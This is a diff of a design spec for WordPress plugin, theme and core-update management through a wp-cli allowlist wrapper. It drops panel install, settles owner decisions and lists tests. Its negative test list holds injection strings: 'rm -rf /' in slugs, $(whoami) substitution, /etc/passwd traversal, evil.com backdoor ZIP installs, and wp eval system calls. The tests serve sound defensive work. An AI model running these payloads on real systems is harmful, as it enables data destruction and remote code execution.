-and "Update safely" (admin, safe-update compound job). Auto-update setting shows
-`signals.auto_update_core` with a selector (minor / major / off).
+and "Update safely" (operator, safe-update compound job — the recommended default
+for core). Auto-update setting shows `signals.auto_update_core` with a selector
+(minor / major / off).
 
 ### 6.4 Safe-update job progress UI
 
@@ -523,12 +684,14 @@ On rollback:
 ### In scope (this feature)
 
 - Structured wp allowlist widening in `vibe-panel-run` + matching `VIBE_OPS` entries
-- Per-item plugin ops: activate, deactivate, update, install (wp.org), delete
-- Theme parity: activate, update, install (wp.org), delete
+- Per-item plugin ops: activate, deactivate, update, delete
+- Theme parity: activate, update, delete
 - Per-item auto-update toggles (wp plugin/theme auto-updates enable/disable)
 - Site-wide core auto-update setting (via `site-config-apply` / `WP_AUTO_UPDATE_CORE`)
 - Scheduled auto-updates via a new `auto-update-schedule-apply` op + systemd timer
-- Safe-update compound job (backup → update → smoke+TTFB → auto-restore)
+  (Off / Weekly / Daily)
+- Safe-update compound job (backup → update → smoke+TTFB → auto-restore), operator-
+  accessible, sequential bulk
 - Plugins and Themes table UI with per-row actions
 - "Update all (safely)" and "Update all" bulk buttons
 - Core update card with safe-update option
@@ -536,18 +699,16 @@ On rollback:
 
 ### Out of scope
 
+- **Plugin/theme install from the panel** — excluded by owner decision (#1). Owners
+  install via wp-admin; installed items appear in the inventory on the next refresh.
+  (This also permanently excludes ZIP-URL install as an RCE vector.)
 - **Screenshot/visual regression diff** — requires headless Chromium; deferred.
-  The HTTP+TTFB+smoke approach covers ~80% of regressions cheaply. Add Chromium
-  as a later layer once the baseline is proven.
-- **ZIP-URL plugin/theme install** — permanently excluded (RCE vector). If a plugin
-  is not on wordpress.org, the owner installs it manually and it appears in the
-  inventory. A future "upload ZIP" flow via the panel would require a quarantine
-  scan (out of scope for this wave).
+  The HTTP+TTFB+smoke approach covers ~80% of regressions cheaply.
 - **Multi-site / network plugin management** — `network_active` is surfaced in the
   inventory but per-network ops are deferred.
 - **WP CLI package management** — explicitly blocked at the wrapper.
 - **Rollback to an arbitrary older version** — `restore` already handles this via
-  the backup browser (feature #4D, out of scope here).
+  the backup browser (extra D, out of scope here).
 - **Staging-first safe-update** — apply to staging, smoke, then promote. A strong
   pattern, but depends on both staging existing and safe-update being proven first.
   Revisit in extra A.
@@ -558,17 +719,17 @@ On rollback:
 
 All phases are TDD-first. The wrapper allowlist test suite is the critical path.
 
-### Phase 0 — Prerequisite: feature #3 insights op (not part of this feature)
+### Phase 0 — Prerequisite: feature #3 insights op
 
 Feature #3 must ship the `insights` op and `insights.json` drop-file before the
 plugin/theme UI can be driven from inventory data. Feature #4 can be built in
-parallel but the UI will show stubs until #3 lands.
+parallel against fixtures but the UI will show stubs until #3 lands.
 
 ### Phase 1 — Wrapper allowlist widening + test suite (critical path)
 
 1. Write `test/wrapper/validate_wp_args.bats` (Bash BATS or equivalent) covering:
-   - All allowed verb × namespace combinations (positive cases)
-   - All injection vectors from §10 (negative cases)
+   - All allowed verb × namespace combinations (positive cases) — **no install**
+   - All injection vectors from §10 (negative cases), including `install` rejected
    - Slug boundary cases (63-char valid, 64-char rejected, URL rejected)
    - `--version=` valid and injection cases
    - `--path=`, `--url=` blocked
@@ -578,17 +739,18 @@ parallel but the UI will show stubs until #3 lands.
 
 ### Phase 2 — `VIBE_OPS` expansion + panel-side slug validation
 
-1. Add all new entries to `VIBE_OPS` in `exec.ts`.
+1. Add all new entries to `VIBE_OPS` in `exec.ts` (no install ops).
 2. Add `assertSlug` to `exec.ts` and call it from `buildVibeArgv` when `takesArg`.
 3. Write unit tests in `core-bridge/exec.test.ts` for slug validation.
 
 ### Phase 3 — New routers
 
-1. `routers/plugins.ts` — per-item actions + auto-update toggle.
+1. `routers/plugins.ts` — per-item actions + auto-update toggle + safeUpdate.
 2. `routers/themes.ts` — per-item actions + auto-update toggle (theme parity).
 3. Update `routers/updates.ts` to expose core update card data from insights.
 4. Wire routers into the tRPC root.
-5. Unit tests for each router (mock `runVibe` / `startJob`).
+5. Unit tests for each router (mock `runVibe` / `startJob`), asserting tier
+   enforcement (operator vs admin).
 
 ### Phase 4 — Auto-update schedule op
 
@@ -602,7 +764,7 @@ parallel but the UI will show stubs until #3 lands.
 1. Write `core-bridge/safe-update.ts` with the chained flow (§4.1).
 2. Write unit tests with mocked sub-ops (backup, update, smoke, restore).
 3. Write integration test with a real local Docker stack (skip in CI, run on VPS).
-4. Add `safeUpdate` endpoint to `routers/plugins.ts` (admin procedure).
+4. Add `safeUpdate` endpoint to `routers/plugins.ts` (operator procedure).
 
 ### Phase 6 — UI
 
@@ -617,58 +779,20 @@ parallel but the UI will show stubs until #3 lands.
 
 Deploy to the test VPS. Validate:
 - Plugin activate / deactivate / update on a real plugin.
-- `wp plugin install` from wordpress.org.
 - `wp plugin delete` on a real (inactive) plugin.
 - Theme activate / update.
 - Safe-update: inject a deliberate regression (temporary), confirm auto-restore.
 - Auto-update toggle round-trip.
 - Scheduled update timer installed and listed by `systemctl`.
-- Injection test suite run against the live wrapper.
+- Injection test suite run against the live wrapper (confirm `install` rejected).
 
 ---
 
-## 9. Open decisions for the owner
+## 9. Resolved decisions
 
-These require an explicit call before phase-6 UI or phase-1 wrapper work begins.
-
-1. **ZIP-URL install — ever?** The spec permanently excludes arbitrary ZIP URLs.
-   If the owner wants a "Upload ZIP" flow for premium plugins not on wordpress.org,
-   it must be a separate quarantine design (virus scan + signature check + manual
-   approval). Confirm: ZIP install out of scope permanently, or design a quarantine
-   path?
-
-2. **Auto-update default: on or off?** When the insights mu-plugin is first
-   installed, should `auto_update` be opt-in (null/off by default, owner enables
-   per-plugin) or opt-out (on by default, owner disables)? Off-by-default is safer
-   and matches WP core behavior; on-by-default reduces maintenance burden. Recommend:
-   off-by-default for core, owner's discretion for plugins.
-
-3. **Operator vs admin: which actions cross the line?** Current proposal:
-   `activate`/`deactivate`/`update`/`auto-update toggle` = operator;
-   `install`/`delete`/`core update`/`safe-update` = admin. Is this correct for your
-   multi-user setup, or should `update` be admin-only too (to require the safe-update
-   path for all mutations)?
-
-4. **Safe-update: admin-only or operator?** Current proposal: admin-only (it runs
-   a backup + restore). If the site has a trusted operator who should be able to
-   safe-update without admin access, this can be relaxed to operator. Note that
-   safe-update internally calls `restore` which is currently `adminProcedure` — that
-   must stay admin unless both are relaxed together.
-
-5. **TTFB threshold (3 seconds): configurable or hardcoded?** 3 s is conservative
-   for most sites. High-traffic or uncached sites may spike above this on the first
-   post-restore request (cold cache). Should this be a per-site env key
-   (`VIBE_SAFEUPDATE_TTFB_THRESHOLD_MS`) or a hardcoded value?
-
-6. **Scheduled auto-updates: which schedule options?** Proposal: Off / Weekly /
-   Daily. Monthly is probably too infrequent to be useful; hourly is dangerous.
-   Confirm the three options, or add a "Monthly" tier for conservative sites?
-
-7. **Safe-update for bulk ("Update all safely"): parallel or sequential per-plugin?**
-   Parallel is faster but a failed plugin could leave the site in a mixed state.
-   Sequential (one plugin at a time, stop on first failure) is safer but slow for
-   sites with 20+ plugins. Recommend: sequential, with a pre-run single backup
-   before the first update (not one backup per plugin).
+All previously-open owner decisions are resolved in §0. No open decisions remain.
+The single remaining **gate** before merge is the §5.3 wrapper security review by
+an independent reviewer.
 
 ---
 
@@ -685,12 +809,11 @@ shell test harness against the live `validate_wp_args` function.
 wp plugin activate contact-form-7
 wp plugin deactivate woocommerce
 wp plugin update akismet
-wp plugin install query-monitor
 wp plugin delete hello-dolly
-wp plugin auto-updates enable redis-cache disable
+wp plugin auto-updates enable redis-cache
+wp plugin auto-updates disable redis-cache
 wp theme activate twentytwentyfour
 wp theme update astra
-wp theme install hello-elementor
 wp theme delete storefront
 wp core update
 wp core update --version=6.8.1
@@ -701,20 +824,22 @@ wp plugin list --update=available --format=json   # legacy form must still work
 **Negative (must reject):**
 
 ```sh
+# install is no longer an allowed verb (owner decision #1)
+wp plugin install query-monitor
+wp theme install hello-elementor
+wp plugin install "https://evil.com/backdoor.zip"
+wp plugin install "http://evil.com/shell.php"
+
 # Metacharacter injection via slug
 wp plugin activate "contact-form-7; rm -rf /"
 wp plugin update "woo$(whoami)merce"
-wp plugin install "woo|evil"
+wp plugin delete "woo|evil"
 wp plugin delete "../../../etc/passwd"
-
-# URL injection in install
-wp plugin install "https://evil.com/backdoor.zip"
-wp plugin install "http://evil.com/shell.php"
 
 # Path traversal flags
 wp plugin update akismet --path=/tmp/evil
 wp plugin activate akismet --url=https://evil.com
-wp plugin install akismet --require=/tmp/evil.php
+wp plugin update akismet --require=/tmp/evil.php
 
 # Blocked verbs
 wp eval "system('id')"
@@ -729,7 +854,7 @@ wp INVALID activate slug
 wp plugin INVALID slug
 
 # Version flag injection
-wp plugin install akismet --version="1.0; rm -rf /"
+wp plugin update akismet --version="1.0; rm -rf /"
 wp core update --version="6.8.1 && evil"
 
 # Multi-arg attacks
@@ -749,28 +874,31 @@ wp plugin update
 - `assertSlug`: accepts valid, rejects URL/metacharacter/empty/too-long.
 - `buildVibeArgv` with each new op: confirms argv shape.
 - Each router handler: mocked `startJob`, confirms correct `op` + `args` + procedure
-  tier enforcement.
+  tier enforcement driven by `WP_ACTION_TIERS` (delete + standalone restore reject
+  operators; activate/deactivate/update/core update/safeUpdate accept operators).
+- `WP_ACTION_TIERS` / `procedureFor`: a table-driven test asserting every action key
+  maps to the documented tier (guards against a silent miswiring).
 - Safe-update unit: each branch (success, smoke-fail→restore, restore-fail).
 
 ### 10.3 Integration tests
 
 - Full safe-update flow against a local Docker stack (backup → update → smoke →
   succeed); requires `WP_HOME` resolvable from the test runner.
-- Safe-update rollback: install a plugin that breaks the homepage (mock smoke
-  failure), confirm restore is triggered and verified.
+- Safe-update rollback: simulate a smoke failure, confirm restore is triggered and
+  verified, and that it used the in-job snapshot (not the standalone admin restore).
 
 ### 10.4 VPS validation checklist
 
 - [ ] `wp plugin activate` / `deactivate` round-trip on a real plugin
 - [ ] `wp plugin update` on a single plugin with an available update
-- [ ] `wp plugin install` from wordpress.org (slug only, not URL)
-- [ ] `wp plugin delete` on an inactive plugin
+- [ ] `wp plugin delete` on an inactive plugin (admin only)
 - [ ] `wp theme activate` + `update`
 - [ ] Auto-update toggle: enable → check `wp plugin auto-updates status`; disable → revert
-- [ ] `auto-update-schedule-apply daily` → `systemctl list-timers | grep vibe-wp-autoupdate`
+- [ ] `auto-update-schedule-apply weekly` → `systemctl list-timers | grep vibe-wp-autoupdate`
 - [ ] Safe-update with success: fresh backup listed, update applied, smoke passes
 - [ ] Safe-update with failure: smoke artificially broken, auto-restore triggered, site returns to pre-update state
-- [ ] Injection test suite from §10.1 run on the live wrapper binary
+- [ ] Operator account can run update (plugin/theme/core) + safe-update; operator account is rejected from delete + standalone restore
+- [ ] Injection test suite from §10.1 run on the live wrapper binary, including `wp plugin install` rejected
 
 ---
 
@@ -780,7 +908,7 @@ wp plugin update
 - `control-panel/packages/api/src/core-bridge/exec.ts` — `VIBE_OPS`, `buildVibeArgv`, `wrapVibeArgv`, `streamVibe`, `runVibe`
 - `control-panel/packages/api/src/core-bridge/jobs.ts` — `startJob`, `launchJob`, `drainJob`, `JobEntry`, `LineStream`
 - `control-panel/packages/api/src/routers/updates.ts` — existing `updatesAvailable` + `updatesApply`
-- `control-panel/packages/api/src/routers/backups.ts` — `backupsRun`, `backupsRestore`, `backupsVerify` (safe-update borrows these patterns)
+- `control-panel/packages/api/src/routers/backups.ts` — `backupsRun`, `backupsRestore` (admin), `backupsVerify` (safe-update borrows these patterns)
 - `bin/backup` — backup op script (manifest.txt format, `--local-only` flag)
 - `bin/restore` — restore op script (`--yes` required, auto-fetches from R2)
 - `bin/smoke` — smoke test script (doctor-runtime + HTTP + FastCGI HIT + upload check)
